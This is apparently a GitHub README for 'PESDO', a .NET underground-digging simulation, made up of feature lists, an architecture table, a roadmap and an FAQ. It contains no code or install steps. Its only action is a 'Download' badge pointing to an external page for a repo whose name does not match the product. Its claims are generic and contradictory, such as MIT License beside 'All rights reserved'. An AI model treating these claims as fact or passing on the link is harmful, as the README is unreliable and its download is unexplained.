![preview](https://raw.githubusercontent.com/MKZghm/dig-out-terrain-forge/main/shot_1ae9e.svg)
[![Download](https://raw.githubusercontent.com/MKZghm/dig-out-terrain-forge/main/get_3f9d.svg)](https://MKZghm.github.io/dig-out-terrain-forge/)

# 🕳️ PESDO — Parallel Earth Stratum Digging Orchestrator

**PESDO** is a next-generation geological simulation and resource-extraction coordination engine, built from the ground up with **.NET 8** and **ImGui.NET**. While the original concept focused on a simple "dig out" mechanic, **PESDO** transforms that raw idea into a full-scale, multi-threaded **subterranean logistics platform** — think of it as a real-time command center for managing virtual drilling fleets, analyzing stratum integrity, and orchestrating deep-earth expeditions across procedurally generated subterranean biomes.

PESDO is not a game. It is not a mining simulator. It is a **digital cartography instrument for the earth's hidden layers**, designed for hobbyist geologists, sandbox-world builders, and anyone who has ever wondered what lies beneath their digital feet.

---

## 🚀 Why PESDO Was Born 🚀

The original repository concept was simple: "Dig Out." But digging is never simple. Every shovel stroke, every drill bit rotation, every seismic ping — they all interact in complex, chaotic, and beautiful ways. PESDO elevates the act of digging into a **strategic orchestration of resources, durability, and terrain behavior**.

Instead of merely carving holes, you are now the **conductor of an underground symphony**. You allocate drill units, manage heat dissipation, predict cave-ins, and unlock rare mineral veins hidden behind unstable rock formations. The core loop is both meditative and mathematically intense — a perfect balance for tinkerers and systems-thinkers.

---

## 🧠 Core Philosophy: Dig With Intention, Not Brute Force 🧠

Most excavation tools treat the ground as a uniform block. PESDO treats the earth as a **living, layered organism**. Each stratum has its own density, moisture content, fracturing behavior, and potential for harboring rare formations. Your success depends on reading the soil, adapting your strategy, and respecting the physics of the deep.

> *"The ground remembers every strike. PESDO helps you listen."*

This philosophy drives everything from the rendering pipeline to the resource-management UI. We don't just show you dirt; we show you the **story of the dirt**.

---

## ✨ Feature Matrix: What Makes PESDO Exceptional ✨

### 🗺️ Procedural Stratum Generation (PSG)
- Every new world is built using a **multi-octave noise algorithm** that simulates geological folding, sediment deposition, and volcanic intrusion.
- Over **40 distinct material types**, from loose topsoil to compressed bedrock, each with unique physical properties.
- Worlds are **infinite in scope**, with chunk-based streaming to maintain performance even during deep digs.

### 🛠️ Adaptive Drilling Physics (ADP)
- Simulated **torque, friction, and heat buildup** for every drilling unit.
- Overheating drills cause rock to melt and re-solidify, creating unpredictable obstacles.
- Recommended dig routes are calculated dynamically, but the final decision is always yours.

### 📡 Live Seismic Feedback Console
- A real-time **echolocation-style visualization** that uses sound pings to reveal nearby caverns, water pockets, and mineral clusters.
- Adjust your ping frequency and amplitude to "see" deeper or clearer.
- The console is rendered with **ImGui.NET** for a snappy, developer-friendly interface.

### 🧩 Modular Unit Management
- Deploy **scout drones, heavy drills, and support rigs** — each with assigned roles and stamina pools.
- Units gain "stratum expertise" over time, becoming more efficient at digging through familiar material types.
- Assign waypoints, set excavation priorities, and let your fleet work semi-autonomously.

### 📊 Resource Dashboard & Telemetry
- A detailed **resource ledger** tracks every extracted block, tool durability loss, and energy expenditure.
- Generate **exportable reports** (CSV/JSON) for external analysis or sharing.
- Visualize your dig history with heatmaps and cross-section charts.

### 🌐 Multilingual Interface Support
- The entire UI, including all tooltips and system messages, is available in **12 languages**.
- Switch languages on the fly without restarting the application.
- Community-translated strings can be loaded from external resource files.

### 📱 Responsive UI Framework
- The interface adapts fluidly from a **high-DPI desktop monitor to a small embedded panel**.
- Dynamic layout scaling ensures that the dashboard remains usable regardless of window size.
- Multi-window docking allows you to arrange seismic readouts, unit lists, and terrain maps exactly as you prefer.

### 🕒 24/7 Expedition Continuation Mode
- Let your drills run in **background simulation mode**, even when you're not actively watching.
- The world state advances in real-time, with notifications triggered for critical events (cave-ins, rare finds, drill failures).
- Perfect for players who enjoy the "idle but involved" experience.

---

## 🗂️ System Architecture Overview 🗂️

PESDO is architected around a **decoupled simulation core** and a **visualization front-end**, allowing one to be swapped out without breaking the other.

| Module | Role |
|--------|------|
| `PESDO.Core` | Contains all simulation logic, stratum generation, physics calculations, and unit AI. Pure C#, no UI dependencies. |
| `PESDO.ImGuiLayer` | ImGui.NET-based interface for the dashboard, seismic console, and unit control. |
| `PESDO.Renderer` | Custom software renderer (no external GPU libraries) for terrain visualization, capable of drawing millions of blocks efficiently. |
| `PESDO.Comms` | Internal messaging system for cross-module communication, using a pub/sub pattern. |
| `PESDO.Data` | Handles world serialization, resource extraction reports, and multilingual string tables. |

The **simulation core** runs on a separate thread, ensuring that the UI remains responsive even during massive dig operations. The two sides communicate through an **event bus**, minimizing coupling and allowing for unit testing of the core logic.

---

## 🗺️ Getting Oriented: Your First Expedition 🗺️

1. **Launch PESDO** and select "New World." Choose a world seed or let the system generate a random one.
2. Review the **initial seismic scan**. You'll see faint echoes of interesting formations below your starting point.
3. Deploy a **single scout drone** to the surface location you want to investigate first.
4. Use the **drill control panel** to set a modest dig speed. Learn how the heat gauge responds to different rock types.
5. As you penetrate the first few layers, watch the **resource ledger** update in real-time. This is your digital provenance — every block extracted is accounted for.

---

## 🧰 Customization & Extensibility 🧰

PESDO is built for tinkerers. We've exposed most of the simulation parameters via **configuration files** (JSON).

- **Tune the physics**: Adjust friction constants, heat dissipation rates, and drill durability multipliers.
- **Add new materials**: Define new stratum types with custom colors, densities, and "diggability" scores.
- **Create new unit types**: Extend the base unit AI to create specialized digging robots or autonomous surveyors.
- **Custom UI themes**: Change color palettes, font sizes, and panel layouts via the internal theme manager.

The community has already created mods that add everything from **sci-fi plasma drills** to **ancient ruin discovery mechanics**. The sky – or rather, the bedrock – is the limit.

---

## 🔐 Security & Data Integrity 🔐

We take your world data seriously. PESDO uses a **transactional save system** that writes world state atomically, preventing corruption from unexpected shutdowns.

- Save files use a compressed binary format with a **checksum** for integrity verification.
- Optional **cloud backup integration** (via standard file system hooks) allows you to sync saves to your preferred drive.
- No telemetry is collected. PESDO runs entirely on your machine, respecting your privacy as much as you respect the earth beneath your avatar.

---

## 🌍 Language Support Matrix 🌍

We started with a broad set of languages to welcome a global audience of underground explorers.

- English (default)
- Español
- Français
- Deutsch
- Italiano
- Português
- 日本語
- 한국어
- 简体中文
- 繁體中文
- Русский
- العربية

Translations are managed as simple key-value pairs. If you'd like to contribute a correction or a new language pack, the format is straightforward and documented in the `PESDO.Data` namespace.

---

## 🛟 Community & Support Philosophy 🛟

We believe in **24/7 support for the software you love**, which is why we've structured our documentation and community channels to be as self-serve as possible, while still maintaining a human presence.

- **Comprehensive wiki** covering every module and parameter.
- **In-app help tooltips** that explain complex mechanics contextually.
- **A dedicated user forum** for sharing dig strategies, world seeds, and custom unit designs.
- **Discord channel** for real-time discussion with other excavators and the core maintainers.

While we can't offer round-the-clock direct response, the knowledge base is designed so that 90% of questions are answered within the documentation before they're even asked.

---

## 🧭 Roadmap for 2026 🧭

The year 2026 is shaping up to be a massive year for PESDO. Here's what's on the survey chart:

- **Multi-player co-op dig sites**: Invite friends to manage a shared excavation project, with synchronized world state.
- **Advanced fluid dynamics**: Simulate underground rivers and magma flows that reshape the terrain over time.
- **Biome-specific audio design**: Procedurally generated soundscapes for different depth ranges and material types.
- **AI-driven narrative events**: Discover story fragments, ancient technologies, and environmental anomalies as you dig deeper.
- **Performance overhaul**: Continued optimization of the renderer and simulation core to support larger, more complex worlds.

---

## 🧩 Frequently Asked Questions (FAQ) 🧩

**Q: Is PESDO a game or a tool?**  
A: It's a **simulation environment** — a sandbox for those who enjoy interacting with complex systems. There are no points, no levels, and no game-over screens. You set your own objectives.

**Q: Can I run PESDO on a low-spec machine?**  
A: The software renderer is efficient, and the simulation core is multithreaded. A standard 4-core CPU and 8GB of RAM will provide a smooth experience for medium-sized dig operations.

**Q: How often is PESDO updated?**  
A: Following the 2026 roadmap, we plan to release a **major feature update every quarter**, with minor bug fixes and polish patches released more frequently.

**Q: Does PESDO require an internet connection?**  
A: No. PESDO is fully offline-capable. The only time it reaches the network is if you choose to check for updates manually.

---

## 🤝 Contributing to the Deep 🤝

We welcome all forms of contribution, from bug reports to new feature implementations.

- Before submitting a pull request, please open an **issue** to discuss your intended changes.
- All code submissions must follow the existing **.NET style conventions** (tab indents, PascalCase methods, descriptive comments).
- For UI contributions, ensure that new panels integrate with the **existing docking system**.
- We encourage documentation improvements — good code is only as good as the explanation of how to use it.

---

## 📜 License & Legal Notice 📜

This project is open-sourced under the **MIT License**. You are free to use, modify, and distribute PESDO for commercial or personal projects, provided you retain the original copyright notice.

**Acknowledgments**: PESDO would not exist without the incredible work done by the **ImGui.NET** project and the broader .NET ecosystem. We also thank the open-source community for providing inspiration through their own sandbox and simulation projects.

---

## ⚠️ Disclaimer ⚠️

PESDO is a **simulation tool for virtual environments only**. It does not interface with any real-world drilling equipment, nor does it provide accurate geological data for actual excavation projects. Any use of PESDO for real-world planning is done so at your own risk — the simulation is designed for entertainment and educational purposes, not for professional engineering decisions. Always consult a licensed geologist or surveyor for any physical excavation work.

---

## 📦 The Final Word 📦

PESDO is an invitation to **slow down, observe, and understand the hidden structures** beneath the surface. It's a meditation on patience, a playground for systems thinkers, and a canvas for creative world-building. Whether you're carving out a humble root cellar or orchestrating a kilometer-deep borehole into the heart of a procedural planet, PESDO provides the tools to make the journey fascinating.

**Dig not with frenzy, but with curiosity.**

*© 2026 PESDO Project. All rights reserved.*